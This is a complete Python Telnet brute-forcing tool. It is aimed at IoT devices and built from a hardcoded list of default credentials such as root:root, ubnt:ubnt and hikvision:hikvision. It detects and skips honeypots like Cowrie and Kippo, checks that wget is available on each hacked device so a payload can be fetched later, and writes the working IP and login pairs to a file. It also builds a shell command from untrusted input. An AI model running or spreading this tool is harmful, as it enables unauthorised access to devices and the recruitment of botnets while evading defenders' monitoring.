#!/usr/bin/env python3
# Telnet Bruter
import threading
import sys, os, re, time, socket
from queue import Queue
from sys import stdout

if len(sys.argv) < 4:
	print("Usage: python "+sys.argv[0]+" <list> <threads> <output file>")
	sys.exit()

combo = [ 
	"root:",
	"admin:",
	"root:root",
	"admin:admin",
	"user:user",
	"ubnt:ubnt",
	"ubuntu:ubuntu",
	"guest:guest",
	"support:support",
	"default:default",
	"test:test",
	"fake:fake",
	"root:admin",
	"admin:root",
	"root:123",
	"root:1234",
	"root:12345",
	"root:123456",
	"root:changeme",
	"admin:changeme",
	"guest:1234",
	"guest:12345",
	"guest:123456",
	"admin:1234",
	"admin:12345",
	"admin:123456",
	"hikvision:hikvision",
	"root:toor",
	":",
	"operator:operator",
	"ftp:ftp",
	"root:888888",
	"default:",
	"1234:1234"
]

ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
output_file = sys.argv[3]
queue = Queue()
queue_count = 0

for ip in ips:
	queue_count += 1
	queue.put(ip)
print("[*] Loaded %d IPs to scan" % queue_count)


class router(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = str(ip).rstrip('\n')
	def run(self):
		for passwd in combo:
			username = ""
			password = ""
			
			# Parse username and password from combo
			if ":" in passwd:
				parts = passwd.split(":", 1)
				username = parts[0]
				password = parts[1]
			
			# Try to connect and authenticate
			try:
				tn = socket.socket()
				tn.settimeout(3)  # Reduced from 8 to 3 seconds
				tn.connect((self.ip, 23))
			except Exception:
				try:
					tn.close()
				except:
					pass
				# Connection failed, but continue trying other combos
				continue
			
			try:
				# Fast login sequence - reduced timeouts
				tn.settimeout(1.5)
				hoho = readUntil(tn, "ogin:", timeout=1.5)
				if "ogin" in hoho:
					tn.send((username + "\n").encode())
					time.sleep(0.05)  # Reduced from 0.09
				else:
					try:
						tn.close()
					except:
						pass
					continue
			except Exception:
				try:
					tn.close()
				except:
					pass
				continue
			
			try:
				# Fast password sequence
				tn.settimeout(1.5)
				hoho = readUntil(tn, "assword:", timeout=1.5)
				if "assword" in hoho:
					tn.send((password + "\n").encode())
					time.sleep(0.3)  # Reduced from 0.8
			except Exception:
				try:
					tn.close()
				except:
					pass
				continue
			
			try:
				# Check for successful login (quick banner + prompt read)
				tn.settimeout(1.0)
				prompt = tn.recv(2048).decode('utf-8', errors='ignore')
				success = False
				# Fast-path prompt detection
				if (">" in prompt and "ONT" not in prompt) or ("#" in prompt) or ("$" in prompt) or ("%" in prompt) or ("@" in prompt):
					success = True
				
				if success:
					# Optimized legit check (single RTT)
					if not self.is_legit_telnet(tn):
						# Log fake/honeypot result to console
						try:
							print("\033[31m[FAKE]\033[37m %s:23 %s:%s" % (self.ip, username, password))
						except:
							pass
						try:
							tn.close()
						except:
							pass
						continue
					# Real device - Successful login!
					# Test wget capability
					wget_ok = self.test_wget(tn)
					wget_status = "wget:OK" if wget_ok else "wget:NO"
					
					# Only export to file if wget is available
					if wget_ok:
						os.system("echo "+self.ip+":23 "+username+":"+password+" >> "+output_file+"")
					
					print("\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m [%s]" % (username, password, self.ip, wget_status))
					try:
						tn.close()
					except:
						pass
					break
				else:
					# Wrong credentials, try next combo
					try:
						tn.close()
					except:
						pass
			except Exception:
				try:
					tn.close()
				except:
					pass
	
	def is_legit_telnet(self, tn):
		"""Fast legit telnet detection with minimal RTTs and banner heuristics."""
		try:
			# Tight timeouts for snappy detection
			tn.settimeout(0.6)
			# Single round-trip: echo marker and probe busybox version in one go
			marker = "__AK47CHK__"
			probe = ("echo " + marker + " && (busybox 2>/dev/null || true)\n").encode()
			tn.send(probe)
			time.sleep(0.25)
			data = b""
			try:
				chunk = tn.recv(4096)
				if chunk:
					data += chunk
				# Try to drain a bit more without blocking too long
				tn.settimeout(0.2)
				for _ in range(2):
					try:
						chunk = tn.recv(4096)
						if not chunk:
							break
						data += chunk
					except:
						break
			except:
				pass
			resp = data.decode('utf-8', errors='ignore')
			# Honeypot/fake banners to filter quickly
			banners_sus = [
				"cowrie", "kippo", "honeypot", "artillery", "conpot", "dionaea",
				"nasl", "honeynet", "mock", "emulated", "unknown command"
			]
			lower = resp.lower()
			for bad in banners_sus:
				if bad in lower:
					return False
			# Need marker back to ensure command execution
			if marker not in resp:
				return False
			# Strong IoT indicators
			if "busybox" in lower or "applet" in lower or "built-in" in lower:
				return True
			# Fallback: environment check with a tiny RTT
			tn.settimeout(0.4)
			tn.send(b"uname -a || cat /proc/version || true\n")
			time.sleep(0.2)
			more = b""
			try:
				more = tn.recv(4096)
			except:
				pass
			mresp = (resp + more.decode('utf-8', errors='ignore')).lower()
			linux_indicators = ["linux", "gnu", "uclibc", "musl", "openwrt", "lede", "android"]
			if any(ind in mresp for ind in linux_indicators):
				return True
			return False
		except:
			return False
	
	def test_wget(self, tn):
		"""Test if wget is available on the device - optimized for speed"""
		try:
			tn.settimeout(0.8)  # Reduced from 1.0
			# Fast wget test - single command
			tn.send(b"command -v wget 2>/dev/null || echo NOWGET\n")
			time.sleep(0.2)  # Reduced from 0.3
			
			response = b""
			try:
				response = tn.recv(1024)  # Reduced buffer size
			except:
				pass
			
			resp = response.decode('utf-8', errors='ignore').lower()
			
			# Quick check - if we get "NOWGET" it means wget not found
			return "nowget" not in resp and ("wget" in resp or len(resp.strip()) > 0)
		except:
			return False

def readUntil(tn, string, timeout=8):
	buf = ''
	start_time = time.time()
	while time.time() - start_time < timeout:
		buf += tn.recv(1024).decode('utf-8', errors='ignore')
		time.sleep(0.005)  # Reduced from 0.01
		if string in buf: return buf
	raise Exception('TIMEOUT!')

def worker():
	try:
		while True:
			try:
				IP = queue.get()
				thread = router(IP)
				thread.start()
				queue.task_done()
				time.sleep(0.01)  # Reduced thread delay
			except:
				pass
	except:
		pass

for l in range(threads):
	try:
		t = threading.Thread(target=worker)
		t.start()
	except:
		pass
